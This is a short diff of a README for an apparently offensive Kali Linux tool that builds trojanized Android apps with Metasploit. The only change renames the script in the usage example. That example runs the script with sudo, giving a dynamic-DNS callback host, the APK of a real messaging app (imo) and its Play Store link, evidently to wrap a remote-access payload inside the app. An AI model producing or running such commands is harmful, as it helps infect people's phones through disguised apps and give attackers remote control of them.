@@ -30,7 +30,7 @@ This tool creates a tune-up of the Metasploit program, unlocks the program and i
 # How to Run (Example)
 ```
 # ┌──(unk9vvn㉿avi)-[~]
-# └─$ sudo chmod +x AndTroj.sh;sudo ./AndTroj.sh example.ddns.net imo-messenger.apk https://play.google.com/store/apps/details?id=com.imo.android.imoim
+# └─$ sudo chmod +x atj.sh;sudo ./atj.sh example.ddns.net imo-messenger.apk https://play.google.com/store/apps/details?id=com.imo.android.imoim
 ```
 Only support the Kali Linux operating system
 
